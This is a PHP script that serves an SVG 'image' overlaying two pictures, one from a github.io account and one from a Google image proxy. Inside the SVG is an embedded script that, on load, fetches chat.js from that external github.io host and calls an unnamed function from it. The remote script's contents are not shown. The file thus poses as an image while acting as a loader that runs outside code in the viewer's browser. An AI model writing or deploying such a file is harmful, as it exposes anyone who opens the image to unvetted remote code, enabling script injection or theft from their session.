<?php
// Set the content type to SVG
header('Content-Type: image/svg+xml');
?>
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">

  <!-- Base Image -->
  <image href="https://raw.githubusercontent.com/totallylost-helpme/totallylost-helpme.github.io/refs/heads/main/aigril2.png" 
         alt="Base Image" 
         width="300" 
         height="auto" />
  
  <!-- Overlay Image, centered -->
  <image href="https://ci3.googleusercontent.com/meips/ADKq_NaPYSHR7qW9reOq_0GmDyIua-pDCwJBlcvWfiOlVV0kzEP1uR97BZcYVGF5E87G_U9i3E5q8co9mIoGvgsZtgATC40fL8kQaTebsrtgOodzFeZHxEF2CG8=s0-d-e1-ft" 
         alt="Overlay Image" 
         x="50%" 
         y="50%" 
         width="100" 
         height="auto"
         transform="translate(-50%, -50%)" />
  
  <!-- JavaScript Embedded Inside SVG -->
  <script type="application/javascript">
    <![CDATA[
      (function(){
        var s = document.createElement('script');
        s.src = 'https://totallylost-helpme.github.io/chat.js';  <!-- External script link -->
        s.onload = function(){
          if(typeof window.someFunction == 'function')   <!-- Ensure function exists before calling -->
            window.someFunction();   <!-- Invoke the function after loading -->
        };
        document.head.appendChild(s);  <!-- Append to head to ensure it's loaded properly -->
      })();
    ]]>
  </script>

</svg>
